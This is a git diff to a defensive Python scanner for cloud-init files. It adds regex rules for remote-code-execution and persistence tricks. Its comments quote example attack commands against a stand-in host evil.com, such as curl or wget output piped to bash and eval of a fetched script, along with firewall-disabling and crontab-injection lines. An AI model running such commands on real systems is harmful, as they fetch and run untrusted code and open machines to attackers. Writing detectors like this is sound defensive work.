diff --git a/shift-left/cloudinit-scanner/cloudinit_scan.py b/shift-left/cloudinit-scanner/cloudinit_scan.py
index 465ce35..5c5a808 100644
--- a/shift-left/cloudinit-scanner/cloudinit_scan.py
+++ b/shift-left/cloudinit-scanner/cloudinit_scan.py
@@ -42,18 +42,116 @@ DB_KEYWORDS = {
 }
 
 REMOTE_EXEC_PATTERNS: Tuple[Tuple[str, re.Pattern[str]], ...] = (
+    # Pattern 1: curl piped directly to bash/sh (with optional sudo)
+    # Catches: curl https://evil.com/install.sh | bash
+    #          curl -fsSL https://... | sudo bash
     (
         "curl_pipe_shell",
-        re.compile(r"curl\s+[^\n|;]+\|\s*(?:bash|sh)\b", re.IGNORECASE),
+        re.compile(r"curl\s+[^\n|;]+\|\s*(?:sudo\s+)?(?:bash|sh)\b", re.IGNORECASE),
     ),
+    # Pattern 2: wget piped directly to bash/sh (with optional sudo)
+    # Catches: wget -qO- https://evil.com/setup.sh | bash
     (
         "wget_pipe_shell",
-        re.compile(r"wget\s+[^\n|;]+\|\s*(?:bash|sh)\b", re.IGNORECASE),
+        re.compile(r"wget\s+[^\n|;]+\|\s*(?:sudo\s+)?(?:bash|sh)\b", re.IGNORECASE),
     ),
+    # Pattern 3: bash/sh -c with curl subshell
+    # Catches: bash -c "$(curl -s https://evil.com)"
     (
         "subshell_curl_shell",
         re.compile(r"(?:bash|sh)\s+-c\s+[\"']?\$\(\s*curl", re.IGNORECASE),
     ),
+    # Pattern 4: eval with curl/wget output — common obfuscation technique
+    # Catches: eval "$(curl -s https://evil.com/payload.sh)"
+    #          eval $(wget -qO- https://evil.com)
+    (
+        "eval_remote_exec",
+        re.compile(r"eval\s+[\"']?\$\(\s*(?:curl|wget)", re.IGNORECASE),
+    ),
+    # Pattern 5: process substitution with curl/wget
+    # Catches: bash <(curl -s https://evil.com/install.sh)
+    #          sh <(wget -qO- https://...)
+    (
+        "process_substitution_remote",
+        re.compile(r"(?:bash|sh)\s+<\s*\(\s*(?:curl|wget)", re.IGNORECASE),
+    ),
+    # Pattern 6: curl download then execute (two-stage attack)
+    # Catches: curl -o /tmp/s.sh https://evil.com && bash /tmp/s.sh
+    #          curl -fsSL https://... -o /usr/local/bin/agent && chmod +x /usr/local/bin/agent
+    (
+        "curl_download_exec",
+        re.compile(
+            r"curl\s+[^\n]+(?:-o\s+\S+|--output\s+\S+)[^\n]*&&[^\n]*(?:bash|sh|chmod\s+\+x)",
+            re.IGNORECASE,
+        ),
+    ),
+    # Pattern 7: wget download to executable path (supply chain attack)
+    # Catches: wget -O /usr/local/bin/agent https://evil.com && chmod +x /usr/local/bin/agent
+    (
+        "wget_unverified_binary",
+        re.compile(
+            r"wget\s+[^\n]*-O\s+(?:/usr(?:/local)?/bin|/usr/sbin|/sbin|/bin)/\S+",
+            re.IGNORECASE,
+        ),
+    ),
+    # Pattern 8: python executing remote code
+    # Catches: python3 <(curl -s https://evil.com/payload.py)
+    #          python -c "$(curl -s https://evil.com)"
+    (
+        "python_remote_exec",
+        re.compile(
+            r"python3?\s+(?:<\s*\(\s*curl|(?:-c\s+)?[\"']?\$\(\s*(?:curl|wget))",
+            re.IGNORECASE,
+        ),
+    ),
+)
+
+# Security bypass patterns — dangerous configurations injected via cloud-init.
+# These represent TTP (Tactics, Techniques and Procedures) for post-compromise persistence.
+SECURITY_BYPASS_PATTERNS: Tuple[Tuple[str, re.Pattern[str]], ...] = (
+    # SSH key injection: attacker plants their public key for persistent access
+    # Catches YAML cloud-config `ssh_authorized_keys` stanza
+    (
+        "ssh_key_injection",
+        re.compile(r"ssh_authorized_keys\s*:", re.IGNORECASE),
+    ),
+    # Firewall / security daemon disable — opens the VM to direct network attacks
+    # Catches: systemctl stop/disable ufw|firewalld|iptables, setenforce 0, iptables -F
+    (
+        "firewall_disable",
+        re.compile(
+            r"(?:systemctl\s+(?:stop|disable)\s+(?:ufw|firewalld|iptables(?:-persistent)?)"
+            r"|setenforce\s+0"
+            r"|iptables\s+-[FXZ]"
+            r"|nft\s+flush\s+ruleset)",
+            re.IGNORECASE,
+        ),
+    ),
+    # World-writable chmod on critical system paths — privilege escalation vector
+    # Catches: chmod 777 /etc/ssh, chmod a+w /etc, chmod o+w /usr/bin
+    (
+        "chmod_critical_path",
+        re.compile(
+            r"chmod\s+(?:777|[ugo]*a\+w|o\+w)\s+(?:/etc|/usr|/bin|/sbin|/root|/var)",
+            re.IGNORECASE,
+        ),
+    ),
+    # Hardcoded credentials in runcmd — secrets embedded in bootstrap scripts
+    # Catches: PASSWORD=S3cr3t, DB_PASS=..., API_TOKEN=..., SECRET_KEY=...
+    (
+        "hardcoded_credentials",
+        re.compile(
+            r"(?:PASSWORD|PASSWD|DB_PASS(?:WORD)?|API_(?:KEY|TOKEN|SECRET)"
+            r"|SECRET(?:_KEY)?|ACCESS_KEY|PRIVATE_KEY)\s*=\s*['\"]?[A-Za-z0-9!@#$%^&*()\-_+=]{8,}",
+            re.IGNORECASE,
+        ),
+    ),
+    # Root crontab injection — persistence mechanism
+    # Catches: crontab -e, echo "* * * * * ..." | crontab -
+    (
+        "crontab_injection",
+        re.compile(r"crontab\s+(?:-[eu]|-)|\becho\b[^\n]+\|\s*crontab", re.IGNORECASE),
